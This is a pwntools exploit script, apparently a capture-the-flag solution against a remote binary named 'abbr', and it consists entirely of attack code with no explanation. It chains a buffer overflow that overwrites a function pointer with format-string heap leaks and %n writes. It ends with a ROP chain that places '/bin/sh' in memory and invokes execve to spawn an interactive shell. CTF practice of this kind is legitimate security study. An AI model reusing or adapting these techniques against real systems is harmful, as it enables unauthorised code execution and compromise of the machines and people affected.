from pwn import *

# p = process('./abbr')
p = remote('168.119.108.148', 10010)

pop_rdi = 0x4018da
pop_rsi = 0x404cfe
pop_rdx = 0x4017df
pop_rax = 0x45a8f7
syscall = 0x4012e3
mov = 0x48a425						# mov qword ptr [rsi], rax ; ret
bss_seg = 0x004cb5e0 + 0x100

main = 0x401f78
printf = 0x410ee4

def fmt(payload = b'a'):
	p.recvuntil(b'text: ')
	p.sendline(bytes(payload))

payload = b'imnsho'*150
payload += b'a'*62
payload += p64(printf)

fmt(payload)

fmt(b'%7$p')

heap_leak = int(p.recvline().strip(), 16)
log.info('heap_leak: ' + hex(heap_leak))

heap_base = heap_leak - 0x2ba0
log.info('heap_base: ' + hex(heap_base))

fmt(b'%4202360c%7$n')
fmt()

payload = b'imnsho'*150
payload += b'a'*62
payload += p64(main)

fmt(payload)

fmt()

payload = b'imnsho'*150
payload += b'a'*62
payload += p64(printf)

fmt(payload)

payload = b'%'
payload += str(heap_base + 0x2bc8).encode('utf-8')
payload += b'c%8$lln'

fmt(payload)

fmt(b'%4202582c%11$lln')
fmt(b'%4202582c%7$lln')

fmt(b'a')

payload = p64(heap_base + 0x2ba0)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss_seg)
payload += p64(pop_rax)
payload += b'/bin/sh\x00'
payload += p64(mov)

payload += p64(pop_rdi)
payload += p64(bss_seg)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

fmt(payload)

fmt(b'')

p.interactive()